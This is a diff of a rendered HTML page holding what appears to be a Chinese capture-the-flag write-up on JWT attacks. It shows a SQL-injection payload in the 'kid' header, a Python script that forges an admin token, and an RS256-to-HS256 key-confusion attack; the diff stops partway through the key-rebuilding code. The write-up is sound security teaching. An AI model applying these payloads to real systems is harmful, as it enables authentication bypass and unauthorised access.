+        <li class="md-meta__item">
           <time datetime="2026-11-06 15:35:00+00:00">2026-11-06</time></li>
         
           <li class="md-meta__item">
@@ -3706,16 +3977,16 @@
 <p>两个当时都用不上——<code>/admin.html</code> 要管理员身份，<code>jwks.json</code> 是验签用的公钥，不知道往哪使。先记着。</p>
 <h3 id="kid-sql"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#kid-sql">第一关：把 kid 拼进 SQL</a></h3>
 <p>先把登录拿到的令牌拆开：</p>
-<div class="language-json highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">{</span><span class="nt">"alg"</span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="nt">"kid"</span><span class="p">:</span><span class="s2">"key_002"</span><span class="p">,</span><span class="nt">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">}</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="p">{</span><span class="nt">"sub"</span><span class="p">:</span><span class="s2">"zhangsan"</span><span class="p">,</span><span class="nt">"name"</span><span class="p">:</span><span class="s2">"张三"</span><span class="p">,</span><span class="nt">"role"</span><span class="p">:</span><span class="s2">"user"</span><span class="p">,</span><span class="w"> </span><span class="err">...</span><span class="p">}</span>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">{</span><span class="nt">"alg"</span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="nt">"kid"</span><span class="p">:</span><span class="s2">"key_002"</span><span class="p">,</span><span class="nt">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">}</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">{</span><span class="nt">"sub"</span><span class="p">:</span><span class="s2">"zhangsan"</span><span class="p">,</span><span class="nt">"name"</span><span class="p">:</span><span class="s2">"张三"</span><span class="p">,</span><span class="nt">"role"</span><span class="p">:</span><span class="s2">"user"</span><span class="p">,</span><span class="w"> </span><span class="err">...</span><span class="p">}</span>
 </span></code></pre></div>
 <p><code>kid</code> 是「密钥编号」。<code>key_002</code> 这种命名说明服务端是<strong>按 kid 去一张密钥表里挑密钥</strong>，而不是全站共用一把。</p>
 <p><strong>把 kid 改成一个带单引号的值</strong>：</p>
-<div class="language-json highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nt">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"key_002'"</span>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nt">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"key_002'"</span>
 </span></code></pre></div>
 <p>再请求 <code>/admin.html</code>，返回 <strong>500</strong>，Werkzeug 的调试页把整句 SQL 原样打了出来：</p>
 <p><img alt="报错页回显 SQL" src="../../../assets/images/zerog-stage2/04-sqlite-error.png" /></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">secret_key</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">jwt_keys</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'key_002'</span><span class="err">'</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">secret_key</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">jwt_keys</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'key_002'</span><span class="err">'</span>
 </span></code></pre></div>
 <p><strong>结论：kid 是直接字符串拼进 SQL 的，没有参数化。</strong></p>
 <h4 id="_3"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#_3">关键理解：要控制的是「返回值」，不是「条件」</a></h4>
@@ -3745,10 +4016,10 @@
 </table>
 <p>第一条是我第一反应写的 <code>OR 1=1</code>。它的问题在于只改变「选哪些行」，不改变「选出来的值」——服务端拿到的还是真密钥，你手里的签名对不上，403。</p>
 <p><code>UNION</code> 才是把外部值塞进结果集的办法：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>kid = x' union select 'abc' -- 
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>      │                │       └─ 注释掉原本结尾那个单引号（-- 后面必须有空格）
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>      │                └──────── 你指定的密钥，记牢，下一步签名要用
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>      └───────────────────────── 表里不存在的 key，保证第一条 SELECT 返回 0 行
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>kid = x' union select 'abc' -- 
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>      │                │       └─ 注释掉原本结尾那个单引号（-- 后面必须有空格）
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>      │                └──────── 你指定的密钥，记牢，下一步签名要用
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>      └───────────────────────── 表里不存在的 key，保证第一条 SELECT 返回 0 行
 </span></code></pre></div>
 <p><code>fetchone()</code> 只取第一行，所以前缀必须查不到，否则拿到的还是真密钥，注入白做。</p>
 <h4 id="_4"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#_4">三个条件必须同时满足</a></h4>
@@ -3780,20 +4051,20 @@
 </table>
 <p><strong>三种错法返回的页面一模一样</strong>，只能逐条核对，不能靠试。</p>
 <p>令牌用脚本生成，不要手改：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">hmac</span><span class="o">,</span><span class="w"> </span><span class="nn">hashlib</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span>
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="n">SECRET</span> <span class="o">=</span> <span class="s2">"abc"</span>                                  <span class="c1"># 必须和 union select 里那个字符串一致</span>
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="n">KID</span>    <span class="o">=</span> <span class="s2">"x' union select '"</span> <span class="o">+</span> <span class="n">SECRET</span> <span class="o">+</span> <span class="s2">"' -- "</span>
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="n">b64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">b</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s2">"="</span><span class="p">)</span>
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="n">hdr</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"alg"</span><span class="p">:</span> <span class="s2">"HS256"</span><span class="p">,</span> <span class="s2">"typ"</span><span class="p">:</span> <span class="s2">"JWT"</span><span class="p">,</span> <span class="s2">"kid"</span><span class="p">:</span> <span class="n">KID</span><span class="p">}</span>
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="n">now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="n">pay</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"sub"</span><span class="p">:</span> <span class="s2">"zhangsan"</span><span class="p">,</span> <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"张三"</span><span class="p">,</span> <span class="s2">"role"</span><span class="p">:</span> <span class="s2">"admin"</span><span class="p">,</span> <span class="s2">"iat"</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span> <span class="s2">"exp"</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">}</span>
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
-</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a><span class="n">seg</span> <span class="o">=</span> <span class="p">(</span><span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">hdr</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span>
-</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>       <span class="o">+</span> <span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
-</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">SECRET</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">seg</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
-</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a><span class="nb">print</span><span class="p">((</span><span class="n">seg</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span> <span class="o">+</span> <span class="n">sig</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">hmac</span><span class="o">,</span><span class="w"> </span><span class="nn">hashlib</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">SECRET</span> <span class="o">=</span> <span class="s2">"abc"</span>                                  <span class="c1"># 必须和 union select 里那个字符串一致</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">KID</span>    <span class="o">=</span> <span class="s2">"x' union select '"</span> <span class="o">+</span> <span class="n">SECRET</span> <span class="o">+</span> <span class="s2">"' -- "</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">b64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">b</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s2">"="</span><span class="p">)</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">hdr</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"alg"</span><span class="p">:</span> <span class="s2">"HS256"</span><span class="p">,</span> <span class="s2">"typ"</span><span class="p">:</span> <span class="s2">"JWT"</span><span class="p">,</span> <span class="s2">"kid"</span><span class="p">:</span> <span class="n">KID</span><span class="p">}</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">pay</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"sub"</span><span class="p">:</span> <span class="s2">"zhangsan"</span><span class="p">,</span> <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"张三"</span><span class="p">,</span> <span class="s2">"role"</span><span class="p">:</span> <span class="s2">"admin"</span><span class="p">,</span> <span class="s2">"iat"</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span> <span class="s2">"exp"</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">}</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="n">seg</span> <span class="o">=</span> <span class="p">(</span><span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">hdr</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>       <span class="o">+</span> <span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">SECRET</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">seg</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="nb">print</span><span class="p">((</span><span class="n">seg</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span> <span class="o">+</span> <span class="n">sig</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </span></code></pre></div>
 <p>带上这个 token 访问 <code>/admin.html</code>，进后台：</p>
 <p><img alt="打进后台" src="../../../assets/images/zerog-stage2/02-admin-panel.png" /></p>
@@ -3806,35 +4077,35 @@
 <p>这时候 <code>jwks.json</code> 派上用场：</p>
 <p><img alt="jwks" src="../../../assets/images/zerog-stage2/03-jwks.png" /></p>
 <h4 id="_5"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#_5">两种签名，密钥关系是反的</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>HS256（对称）   签名 = HMAC-SHA256(密钥, header.payload)
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>                验签 = 用同一把密钥再算一遍
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>RS256（非对称） 签名 = RSA-SHA256(私钥, header.payload)   ← 只有私钥能签
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>                验签 = RSA-Verify(公钥, 签名)            ← 谁都能验
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>HS256（对称）   签名 = HMAC-SHA256(密钥, header.payload)
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>                验签 = 用同一把密钥再算一遍
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>RS256（非对称） 签名 = RSA-SHA256(私钥, header.payload)   ← 只有私钥能签
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>                验签 = RSA-Verify(公钥, 签名)            ← 谁都能验
 </span></code></pre></div>
 <p>HS256 的密钥是共享的：<strong>谁能验，谁就能签</strong>。RS256 的公钥是公开的：<strong>只能验，不能签</strong>。</p>
 <h4 id="_6"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#_6">漏洞就在「同一个变量，两种用法」</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">alg</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s2">"alg"</span><span class="p">]</span>                       <span class="c1"># ← 这个值是你写的</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">pub</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"service_public.pem"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s2">"RS256"</span><span class="p">:</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>    <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">"RS256"</span><span class="p">])</span>      <span class="c1"># pub 当公钥用，只能验</span>
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="k">elif</span> <span class="n">alg</span> <span class="o">==</span> <span class="s2">"HS256"</span><span class="p">:</span>                                  <span class="c1"># 「历史兼容」分支</span>
-</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pub</span><span class="p">,</span> <span class="n">signing_input</span><span class="p">,</span> <span class="n">sha256</span><span class="p">)</span> <span class="o">==</span> <span class="n">signature</span>  <span class="c1"># pub 当共享密钥用，能签</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">alg</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s2">"alg"</span><span class="p">]</span>                       <span class="c1"># ← 这个值是你写的</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">pub</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"service_public.pem"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s2">"RS256"</span><span class="p">:</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">"RS256"</span><span class="p">])</span>      <span class="c1"># pub 当公钥用，只能验</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="k">elif</span> <span class="n">alg</span> <span class="o">==</span> <span class="s2">"HS256"</span><span class="p">:</span>                                  <span class="c1"># 「历史兼容」分支</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pub</span><span class="p">,</span> <span class="n">signing_input</span><span class="p">,</span> <span class="n">sha256</span><span class="p">)</span> <span class="o">==</span> <span class="n">signature</span>  <span class="c1"># pub 当共享密钥用，能签</span>
 </span></code></pre></div>
 <p>同一个 <code>pub</code>，上面是公钥，下面是共享密钥。<strong>只要我把 <code>alg</code> 写成 <code>HS256</code>，再用这份公开的 <code>pub</code> 自己算一个签名，服务端会用同一份 <code>pub</code> 再算一遍，结果必然相等。</strong></p>
 <h4 id="ne-pem"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#ne-pem">把 n/e 还原成 PEM</a></h4>
 <p><code>jwks.json</code> 里只有 n 和 e，要拼回 PEM（DER → base64 → 加头尾）：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSAPublicNumbers</span>
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">serialization</span>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="n">j</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">"/jwks.json"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">"keys"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s2">"n"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"=="</span><span class="p">),</span> <span class="s2">"big"</span><span class="p">)</span>
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"=="</span><span class="p">),</span> <span class="s2">"big"</span><span class="p">)</span>
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="n">pem</span> <span class="o">=</span> <span class="n">RSAPublicNumbers</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
-</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>    <span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span> <span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span><span class="p">)</span>
-</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="nb">open</span><span class="p">(</span><span class="s2">"service_public.pem"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSAPublicNumbers</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">serialization</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">j</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">"/jwks.json"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">"keys"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s2">"n"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"=="</span><span class="p">),</span> <span class="s2">"big"</span><span class="p">)</span>
